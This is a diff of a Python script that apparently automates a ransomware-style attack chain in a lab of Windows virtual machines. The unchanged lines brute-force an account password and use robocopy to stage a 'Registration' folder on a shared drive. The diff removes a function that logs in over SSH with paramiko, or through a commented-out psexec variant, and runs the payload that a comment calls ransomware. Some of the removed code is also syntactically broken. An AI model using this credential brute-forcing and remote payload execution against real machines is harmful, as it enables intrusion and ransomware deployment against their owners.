@@ -9,7 +9,7 @@ from pypsexec.client import Client #Sending remote commands
 
 #Walkthrough the Documents folder and the P: drive
 def fileWalk():
-    path= "C:/Users/IEUsers/Documents/"
+    path= "C:/Users/IEUsers/Documents"
     files=[]
     for r, d, f in os.walk(path):
         for file in f:
@@ -73,34 +73,7 @@ def bruteForce(user, ipAddress):
 #Transfer
 def transferFile():
     os.system("robocopy C:/Users/IEUser/Downloads/Registration P:/Registration  ") #P:\\ zip folder
-    # os.system("robocopy P:/Registration //IE9WIN7/Users/IEUser/Downloads/Registration  ")#Fresh copy to start the cycle again 
 
-
-#Remote execute file
-def remoteExecute(ipAddress, user, password):
-    ssh=paramiko.SSHClient()
-    try:
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ipAddress, username=user, password=password)
-        shell= ssh.invoke_shell()
-        stdout, stderr, rcshell.send("C:/Users/IEUser/Downloads/Registration/registration.exe" + "\n")
-
-    except:
-        print("this is done")
-    finally:
-        output = []
-        for i in range(0,6):
-            output.append(stdout.readlines(i))
-        print(output)
-
-
-    # c = Client(ipAddress, username=user, password=password,  encrypt=False)
-    # c.connect()
-    # try:
-    #     c.create_service()
-    #     stdout, stderr, rc = c.run_executable("C:/Users/IEUser/Downloads/Registration/registration.exe") #Execute ransomware from P Drive
-    # except:
-    #     print("done")
 
 def main():
     user= "IEUser"
@@ -112,5 +85,5 @@ def main():
     password=bruteForce(user,ipAddress) 
     print(password)#should return Passw0rd!
     transferFile()
-    remoteExecute(ipAddress,user, password)
+
 main()
